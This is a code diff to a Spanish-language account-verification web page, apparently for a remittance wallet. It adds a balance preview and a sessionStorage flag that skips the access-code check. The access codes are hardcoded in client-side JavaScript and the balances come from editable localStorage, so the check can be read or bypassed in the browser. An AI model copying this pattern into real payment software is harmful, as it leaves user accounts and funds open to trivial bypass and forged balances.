@@ -2539,7 +2539,7 @@
                 <div class="error-message" id="name-error"></div>
             </div>
             
-            <div class="form-group">
+            <div class="form-group" id="access-code-group">
                 <label for="access-code">Clave de Acceso:</label>
                 <input type="password" id="access-code" placeholder="Ingrese su clave de acceso">
                 <div class="error-message" id="code-error"></div>
@@ -2549,6 +2549,11 @@
             <div class="understanding-checkbox">
                 <div class="custom-checkbox" id="understanding-checkbox" onclick="toggleUnderstandingCheckbox()"></div>
                 <div class="confirmation-text">Entiendo que este es un proceso de verificación de mi cuenta y me comprometo a seguir los pasos correctamente.</div>
+            </div>
+
+            <div class="form-group small-text" id="balance-info">
+                Saldo actual: <span id="current-balance-usd">$0.00</span> (<span id="current-balance-bs">Bs 0,00</span>)<br>
+                Saldo tras primera recarga: <span id="future-balance-usd">$0.00</span> (<span id="future-balance-bs">Bs 0,00</span>)
             </div>
             
             <div class="btn-container">
@@ -2848,8 +2853,8 @@
      * CONFIGURACIÓN GLOBAL
      ****************************/
     // Variable centralizada para la tasa de cambio (modifique este valor para actualizar todos los cálculos)
-    const dollarRate = 151.10; // Tasa de cambio actual: 1 USD = X Bs.
-    const accessCodeValues = [
+const dollarRate = 151.10; // Tasa de cambio actual: 1 USD = X Bs.
+const accessCodeValues = [
         '00471841184750799697',
         '01981871084750599643',
         '00971841084750599642',
@@ -2861,7 +2866,11 @@
         '00781641184750569642',
         '010981871084750599644'
     ]; // Mismas claves que en registro y recarga
-    const conceptCode = '4454651'; // Código de concepto unificado
+const conceptCode = '4454651'; // Código de concepto unificado
+
+// Indica si se ingresó desde recarga para omitir la clave
+const skipAccessCode = sessionStorage.getItem('fromRecargaActivacion') === 'true';
+if (skipAccessCode) sessionStorage.removeItem('fromRecargaActivacion');
     
     // Definición de montos disponibles (se filtrarán según el saldo del usuario)
     let availableAmounts = [
@@ -2995,6 +3004,12 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
         
         // Prevenir auto zoom en inputs para dispositivos móviles
         optimizeInputsForMobile();
+
+        updateBalanceInfo();
+        if (skipAccessCode) {
+            const group = document.getElementById('access-code-group');
+            if (group) group.style.display = 'none';
+        }
     });
     
     // Carga diferida de imágenes
@@ -3122,9 +3137,33 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
     }
     
     // Formato para copiado sin puntos (solo con coma decimal)
-    function formatForClipboard(number) {
-        return number.toString().replace(/\./g, "").replace(",", ",");
+function formatForClipboard(number) {
+    return number.toString().replace(/\./g, "").replace(",", ",");
+}
+
+function formatCurrency(amount, currency = 'usd') {
+    if (currency === 'usd') {
+        return '$' + amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     }
+    return 'Bs ' + amount.toLocaleString('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function updateBalanceInfo() {
+    const balanceData = JSON.parse(localStorage.getItem('remeexBalance') || '{}');
+    const currentUsd = balanceData.usd || 0;
+    const currentBs = balanceData.bs || 0;
+    const firstAmount = getValidationAmountByBalance(currentUsd);
+    const newUsd = currentUsd + firstAmount;
+    const newBs = currentBs + firstAmount * dollarRate;
+    const cUsd = document.getElementById('current-balance-usd');
+    const cBs = document.getElementById('current-balance-bs');
+    const fUsd = document.getElementById('future-balance-usd');
+    const fBs = document.getElementById('future-balance-bs');
+    if (cUsd) cUsd.textContent = formatCurrency(currentUsd, 'usd');
+    if (cBs) cBs.textContent = formatCurrency(currentBs, 'bs');
+    if (fUsd) fUsd.textContent = formatCurrency(newUsd, 'usd');
+    if (fBs) fBs.textContent = formatCurrency(newBs, 'bs');
+}
     
     // Sistema de partículas para protección de datos
     function initParticles() {
@@ -3374,14 +3413,16 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
         }
         
         // Validar código de acceso
-        if (accessCode.trim() === '') {
-            document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su código de acceso';
-            isValid = false;
-        } else if (!accessCodeValues.includes(accessCode)) {
-            document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Código de acceso incorrecto';
-            isValid = false;
-        } else {
-            document.getElementById('code-error').textContent = '';
+        if (!skipAccessCode) {
+            if (accessCode.trim() === '') {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su código de acceso';
+                isValid = false;
+            } else if (!accessCodeValues.includes(accessCode)) {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Código de acceso incorrecto';
+                isValid = false;
+            } else {
+                document.getElementById('code-error').textContent = '';
+            }
         }
         
         // Si todo es válido, pasar al siguiente paso
